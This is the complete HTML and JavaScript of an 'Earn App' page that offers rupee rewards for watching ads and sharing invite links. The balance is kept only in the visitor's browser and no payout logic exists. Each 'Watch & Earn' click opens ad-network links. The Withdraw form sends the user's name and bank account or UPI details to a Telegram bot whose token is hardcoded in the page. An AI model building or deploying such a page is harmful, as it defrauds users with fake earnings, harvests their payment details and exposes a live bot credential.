<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Earn App</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
body{margin:0;font-family:Arial;background:#f3f3f3;padding-bottom:90px}
.app{max-width:420px;margin:auto;padding:15px}
.card{background:#fff;border-radius:16px;padding:15px;margin-bottom:18px}
h3{text-align:center}
.balance{font-size:32px;font-weight:bold;text-align:center}
.btn{width:100%;padding:14px;border:none;border-radius:14px;font-size:16px;font-weight:bold}
.purple{background:#7b4ddb;color:#fff}
.orange{background:#ff8a00;color:#fff}
.small{text-align:center;font-size:12px;color:#777}
input{width:100%;padding:12px;border-radius:10px;border:1px solid #ccc;margin-top:10px}

.nav{position:fixed;bottom:0;left:0;right:0;background:#fff;display:flex;justify-content:space-around;border-top:1px solid #ddd;padding:10px 0}
.nav div{font-size:12px;color:#777}
.nav .active{color:#ff8a00;font-weight:bold}

.section{display:none}
.section.active{display:block}

.loader{
 width:18px;height:18px;border:3px solid rgba(255,255,255,.5);
 border-top:3px solid #fff;border-radius:50%;
 animation:spin 1s linear infinite;display:inline-block;margin-right:8px
}
@keyframes spin{to{transform:rotate(360deg)}}
</style>
</head>

<body>

<div class="app">

<!-- REGISTER -->
<div id="register" class="section active">
  <div class="card">
    <h3>Register</h3>
    <input id="username" placeholder="Enter your name">
    <button class="btn purple" onclick="register()">Continue</button>
  </div>
</div>

<!-- HOME -->
<div id="home" class="section">
  <div class="card">
    <h3>Wallet Balance</h3>
    <div class="balance">‚Çπ <span id="bal">0</span></div>
    <button id="watchBtn" class="btn purple">‚ñ∂ Watch & Earn</button>
    <p class="small">Min ‚Çπ1.5 per ad</p>
  </div>
</div>

<!-- INVITE -->
<div id="invite" class="section">
  <div class="card">
    <h3>Invite & Earn</h3>
    <input id="inviteLink" readonly>
    <button class="btn orange" onclick="copyInvite()">Copy Invite Link</button>
    <p class="small">Reward after 30 minutes</p>
  </div>
</div>

<!-- WITHDRAW -->
<div id="withdraw" class="section">
  <div class="card">
    <h3>Withdraw</h3>
    <input id="amount" placeholder="Amount">
    <input id="account" placeholder="Account / UPI">
    <button class="btn orange" onclick="withdraw()">Request Withdraw</button>
  </div>
</div>

</div>

<div class="nav">
  <div onclick="show('home',this)" class="active">üè† Home</div>
  <div onclick="show('invite',this)">üë• Invite</div>
  <div onclick="show('withdraw',this)">üí∏ Withdraw</div>
</div>

<script>
/* ===== CONFIG ===== */
const SMART_LINKS = [
 "https://www.effectivegatecpm.com/b7hmg6des?key=884a2022eb4d830f64a055c008081d0b",
 "https://www.effectivegatecpm.com/b7hmg6des?key=884a2022eb4d830f64a055c008081d0b"
];
const BOT_TOKEN = "8267075604:AAGRZN_erJNQnn_jYX38L1LgD1q3uJknP7M";
const CHAT_ID = "8267075604";

/* ===== STATE ===== */
let balance = +localStorage.balance || 0;
let name = localStorage.name || "";
let linkIndex = 0;

/* ===== INIT ===== */
function init(){
 if(name){
  show("home");
 }
 bal.textContent = balance;
 inviteLink.value = location.href + "?ref=" + name;
}
window.onload = init;

/* ===== REGISTER ===== */
function register(){
 let n = username.value.trim();
 if(!n) return alert("Enter name");
 localStorage.name = n;
 name = n;
 telegram("üÜï New Register\nName: "+name);
 show("home");
}

/* ===== WATCH & EARN ===== */
watchBtn.onclick = ()=>{
 let t = 30;
 watchBtn.disabled = true;
 watchBtn.innerHTML = `<span class="loader"></span> Wait ${t}s`;

 let link = SMART_LINKS[linkIndex];
 linkIndex = (linkIndex+1)%SMART_LINKS.length;
 window.open(link,"_blank");

 let iv = setInterval(()=>{
  t--;
  watchBtn.innerHTML = `<span class="loader"></span> Wait ${t}s`;
  if(t<=0){
   clearInterval(iv);
   balance += 0.5;
   localStorage.balance = balance;
   bal.textContent = balance.toFixed(2);
   watchBtn.disabled = false;
   watchBtn.innerHTML = "‚ñ∂ Watch & Earn";
  }
 },1000);
};

/* ===== INVITE ===== */
function copyInvite(){
 navigator.clipboard.writeText(inviteLink.value);
 let link = SMART_LINKS[linkIndex];
 linkIndex = (linkIndex+1)%SMART_LINKS.length;
 window.open(link,"_blank");

 setTimeout(()=>{
  balance += 5;
  localStorage.balance = balance;
  bal.textContent = balance.toFixed(2);
 },1800000); // 30 min
}

/* ===== WITHDRAW ===== */
function withdraw(){
 let amt = amount.value;
 let acc = account.value;
 if(!amt||!acc) return alert("Fill details");

 telegram(
  "üí∏ Withdraw Request\n"+
  "Name: "+name+
  "\nAmount: ‚Çπ"+amt+
  "\nAccount: "+acc
 );
 alert("Withdraw request submitted");
}

/* ===== TELEGRAM ===== */
function telegram(msg){
 fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
  method:"POST",
  headers:{"Content-Type":"application/json"},
  body:JSON.stringify({chat_id:CHAT_ID,text:msg})
 });
}

/* ===== NAV ===== */
function show(id,el){
 document.querySelectorAll(".section").forEach(s=>s.classList.remove("active"));
 document.getElementById(id).classList.add("active");
 if(el){
  document.querySelectorAll(".nav div").forEach(n=>n.classList.remove("active"));
  el.classList.add("active");
 }
}
</script>

</body>
</html>
